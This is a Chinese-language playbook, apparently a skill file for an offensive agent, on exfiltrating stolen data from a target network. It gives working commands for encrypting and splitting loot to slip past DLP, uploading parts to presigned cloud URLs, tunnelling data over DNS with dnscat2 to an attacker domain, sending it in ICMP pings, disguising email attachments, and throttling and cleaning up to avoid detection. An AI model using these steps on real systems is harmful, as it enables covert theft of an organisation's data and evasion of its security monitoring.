---
name: data-exfiltration
description: 数据外带通道大全：HTTPS/CDN 伪装、DNS 隧道、ICMP、云对象存储、邮件附件切片、加密压缩分卷、速率控制与留痕清理
whenToUse: 已拿到目标数据需要带出；常规出网被 DLP/防火墙封；需要长期低速率渗出避免触发告警
role: internal
enabled: true
---

# 数据外带(Exfiltration)

原则:**先加密再外带**;通道按"封锁代价"从低到高备多条。
**红线:数据在己方落地且哈希校验一致**(不是"发出去了")。

## 一、外带前置:打包与加密

```bash
# 收集时按价值分层(凭据/源码/文档),别整盘拖
7z a -p<强口令> -mhe=on out.7z ./loot/           # AES256+文件名加密
split -b 20M out.7z part_                         # 分卷(小片过 DLP)
# 完整性:双方 sha256sum 对账
```

## 二、通道矩阵

### 1. HTTPS/CDN 伪装(首选,和正常流量混)
```bash
# 伪装成网盘/CDN 上传:POST 到云函数/对象存储的 PUT 预签名 URL
curl -X PUT "https://<bucket>.oss.../a.jpg?sig=..." --data-binary @part_aa
# 特征:域名是知名云厂,内容加密后看似二进制
```
### 2. DNS 隧道(只放行 DNS 的环境)
```bash
# dnscat2(权威域指到 VPS)
dnscat2-server --domain ex.corp.tk
目标侧:./dnscat --domain ex.corp.tk --dns port=53
# 文件:session 内 upload/download;速率低,适合小件(凭据/配置)
```
### 3. ICMP(禁 TCP/UDP 时)
```bash
ping -p <hex字节> <vps>               # 单向;或者 icmpsh/ptunnel 反向
```
### 4. 邮件附件(办公网最自然)
- 分卷 + 改后缀(.7z→.iso/.docx)+ 密码另通道发(短信/另一封)
### 5. 云笔记/网盘账号(目标自己的)
- 登录目标 OneDrive/坚果云,上传即同步到攻击者已控会话

## 三、速率与告警控制
- 大文件:夜间 + 限速(`curl --limit-rate 200k`)拖 3-5 晚
- 每片独立命名混入正常业务流量时段
- DNS 隧道控制在 qps<5,域名轮换

## 四、痕迹
- 外带完删本机缓存分卷与 7z 临时
- 云函数/桶用一次性(用完销毁)
- **不**清 SIEM 已转发日志(清了必被发现),接受日志留痕

## 红线(完成判定)
- 己方收齐全部分卷 → 合并 → 解密 → sha256 与源一致
- 记录:通道/时间/量级/是否触发告警(供复盘)

## 衔接
- 数据来源定位 → asset-correlation(资产关联)
- 通道搭建依赖 c2-persistence 的基建;DNS 隧道复用其域名
